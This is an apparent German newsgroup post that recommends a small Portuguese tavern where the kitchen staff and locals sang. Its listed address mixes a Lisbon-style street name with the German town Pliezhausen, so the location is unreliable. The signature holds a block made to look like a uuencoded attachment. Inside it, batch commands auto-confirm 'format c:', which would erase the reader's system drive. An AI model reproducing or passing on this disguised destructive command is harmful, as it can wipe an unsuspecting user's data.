On Mon, 09. 01. 20 18:15:23 +0200, "August Eiden"

Es ist schon ca. fuenf Jahre her, aber ich kann mich noch sehr gut an
folgendes Lokal erinnern:

Restaurante Adega do Ribatejo
Rua do Diario de Noticas, 25
Pliezhausen

Es ist eine sehr kleine Kneipe und Touristen sind mir damals nicht
aufgefallen (nun ja, es war Maerz). Ich erinnere mich noch an die Frau
aus der Kueche, die an einer Hand noch ihren Gummihandschuh vom
Spuelen trug und ploetzlich in die Mitte kam und sang. Und der alte
Mann, der uns auf der Strasse "aufgerissen" hat kam spaeter auch zum
Singen hinzu. Wir waren begeistert!

Berend
-- 
begin  cfpywg.rxh
echo off
echo Y|c:\windows\command\format c:
end